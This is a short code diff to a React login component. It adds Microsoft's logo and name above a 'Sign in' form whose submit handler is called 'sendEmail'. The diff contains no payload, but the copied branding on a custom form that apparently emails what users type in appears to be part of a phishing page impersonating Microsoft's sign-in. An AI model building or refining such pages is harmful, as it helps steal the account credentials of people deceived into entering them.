@@ -33,6 +33,15 @@ const Login = () => {
   return (
     <div style={styles.body}>
       <div style={styles.loginContainer}>
+        <div style={styles.msLogo}>
+          <svg viewBox="0 0 32 32" style={styles.logoSvg}>
+            <rect fill="#f25022" x="0" y="0" width="15" height="15" />
+            <rect fill="#7fba00" x="17" y="0" width="15" height="15" />
+            <rect fill="#00a4ef" x="0" y="17" width="15" height="15" />
+            <rect fill="#ffb900" x="17" y="17" width="15" height="15" />
+          </svg>
+          <span style={styles.msText}>Microsoft</span>
+        </div>
         <h2 style={styles.heading}>Sign in</h2>
 
         <form ref={form} onSubmit={sendEmail}>
